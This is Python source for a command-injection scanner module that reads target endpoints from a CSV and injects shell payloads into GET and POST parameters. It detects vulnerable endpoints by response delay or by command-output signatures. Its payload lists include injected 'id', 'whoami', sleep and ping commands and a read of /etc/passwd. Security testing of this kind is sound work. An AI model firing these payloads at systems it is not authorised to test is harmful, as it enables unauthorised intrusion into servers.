import sys
import time
import threading
import concurrent.futures
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from modules.logger_config import setup_logger
import pandas as pd
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DELAY = 5  # seconds for time-based detection

# Payloads that trigger a system sleep
TIME_PAYLOADS = [
    f"; sleep {DELAY}",
    f"| sleep {DELAY}",
    f"`sleep {DELAY}`",
    f"$(sleep {DELAY})",
    f"& timeout /T {DELAY}",
    f"&& ping -n {DELAY + 1} 127.0.0.1 > nul",
    f"; ping -c {DELAY} 127.0.0.1",
    f"\n sleep {DELAY}\n",
]

# Payloads that produce recognisable output
OUTPUT_PAYLOADS = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; whoami",
    "| whoami",
    "; cat /etc/passwd | head -3",
    "& whoami",
    "\n id\n",
]

OUTPUT_SIGNATURES = [
    "uid=", "gid=", "groups=",
    "www-data", "root", "apache", "nginx",
    "SYSTEM", "Administrator",
]


class CMDInjectionscanner:
    def __init__(
        self,
        base_url="",
        proxies=None,
        cookies=None,
        dataframe=None,
        threads=10,   # lower default — time-based is slow
        timeout=20,
    ):
        self.base_url = base_url
        self.proxies = proxies
        self.cookies = cookies
        self.threads = threads
        self.timeout = timeout
        self.dataframe = pd.read_csv(dataframe)
        self.vulnerable_endpoints = set()
        self.findings = {}
        self._lock = threading.Lock()
        self.logger = setup_logger(__name__)

    def _request(self, url, method="GET", data=None, timeout=None):
        try:
            t = timeout or self.timeout
            kwargs = dict(
                proxies=self.proxies,
                cookies=self.cookies,
                verify=False,
                allow_redirects=False,
                timeout=t,
            )
            if method == "GET":
                return requests.get(url, **kwargs)
            return requests.post(url, data=data, **kwargs)
        except requests.exceptions.Timeout:
            raise
        except Exception:
            return None

    def _output_probe(self, url, method, params, base_url):
        """Inject output-based payloads and look for command output signatures."""
        for param_key in list(params.keys()):
            original = params[param_key]
            for payload in OUTPUT_PAYLOADS:
                test_params = dict(params)
                val = str(original[0]) if isinstance(original, list) else str(original)
                test_params[param_key] = val + payload

                if method == "GET":
                    test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
                    resp = self._request(test_url, "GET")
                else:
                    resp = self._request(url, "POST", test_params)

                if resp is not None:
                    body = resp.text
                    for sig in OUTPUT_SIGNATURES:
                        if sig in body:
                            self.logger.info(
                                f"[CMD Injection - Output] {url} — param '{param_key}' "
                                f"payload: {payload!r} → signature '{sig}' found\n"
                            )
                            return {
                                "type": "output-based",
                                "param": param_key,
                                "payload": payload,
                                "evidence": f"Signature '{sig}' found in response",
                                "confidence": 0.90,
                            }
            params[param_key] = original
        return None

    def _time_probe(self, url, method, params, base_url):
        """Inject time-based payloads and measure response delay."""
        threshold = DELAY - 1.0
        extended_timeout = self.timeout + DELAY + 3

        for param_key in list(params.keys()):
            original = params[param_key]
            for payload in TIME_PAYLOADS:
                test_params = dict(params)
                val = str(original[0]) if isinstance(original, list) else str(original)
                test_params[param_key] = val + payload

                start = time.time()
                try:
                    if method == "GET":
                        test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
                        self._request(test_url, "GET", timeout=extended_timeout)
                    else:
                        self._request(url, "POST", test_params, timeout=extended_timeout)
                    elapsed = time.time() - start
                except requests.exceptions.Timeout:
                    elapsed = time.time() - start

                if elapsed >= threshold:
                    self.logger.info(
                        f"[CMD Injection - Time-Based] {url} — param '{param_key}' "
                        f"delayed {elapsed:.1f}s with payload: {payload!r}\n"
                    )
                    return {
                        "type": "time-based",
                        "param": param_key,
                        "payload": payload,
                        "evidence": f"Response delayed {elapsed:.1f}s (threshold {threshold}s)",
                        "confidence": 0.72,
                    }
            params[param_key] = original
        return None

    def scan_url(self, url, method, get_params, post_params):
        parsed = urlparse(url)
        base = urlunparse(parsed._replace(query=""))

        url_params = {}
        if get_params and get_params != "{}":
            try:
                raw = json.loads(get_params)
                # parse_qs-style: values are lists
                url_params = {k: [v] if not isinstance(v, list) else v
                              for k, v in raw.items()}
            except Exception:
                url_params = parse_qs(parsed.query, keep_blank_values=True)

        body_params = {}
        if method == "POST" and post_params and post_params != "{}":
            try:
                raw = json.loads(post_params)
                body_params = {k: [v] if not isinstance(v, list) else v
                               for k, v in raw.items()}
            except Exception:
                pass

        finding = None

        if url_params and url not in self.vulnerable_endpoints:
            finding = self._output_probe(url, "GET", url_params, base)
            if finding is None:
                finding = self._time_probe(url, "GET", url_params, base)

        if body_params and url not in self.vulnerable_endpoints:
            finding = self._output_probe(url, "POST", body_params, base)
            if finding is None:
                finding = self._time_probe(url, "POST", body_params, base)

        if finding:
            with self._lock:
                self.vulnerable_endpoints.add(url)
                self.findings[url] = finding

    def gather_results(self):
        self.dataframe["CMD_Injection"] = 0
        if not self.vulnerable_endpoints:
            self.logger.info("No Command Injection vulnerabilities found\n")
        else:
            for url in self.vulnerable_endpoints:
                self.dataframe.loc[
                    self.dataframe["URL"] == url, "CMD_Injection"
                ] = 1

        path = (
            f"{sys.path[0]}/results/{self.base_url}/DF/"
            f"{self.base_url}_cmd_injection.csv"
        )
        self.logger.info(f"Saving Command Injection results to: {path}")
        self.dataframe.to_csv(path, index=False)

    def run(self, row):
        try:
            self.scan_url(
                row["URL"],
                row["Method"],
                row.get("GET Params"),
                row.get("POST Params"),
            )
        except Exception as e:
            self.logger.error(f"Error scanning {row['URL']}: {e}")

    def start_scanning(self):
        self.logger.info("Launching Command Injection scanner\n")
        try:
            with concurrent.futures.ThreadPoolExecutor(
                max_workers=self.threads
            ) as executor:
                executor.map(self.run, [row for _, row in self.dataframe.iterrows()])
            self.gather_results()
        except KeyboardInterrupt:
            self.logger.info("Keyboard interrupt — stopping\n")
            sys.exit(0)
        except Exception as e:
            self.logger.error(f"Error: {e}")
            raise
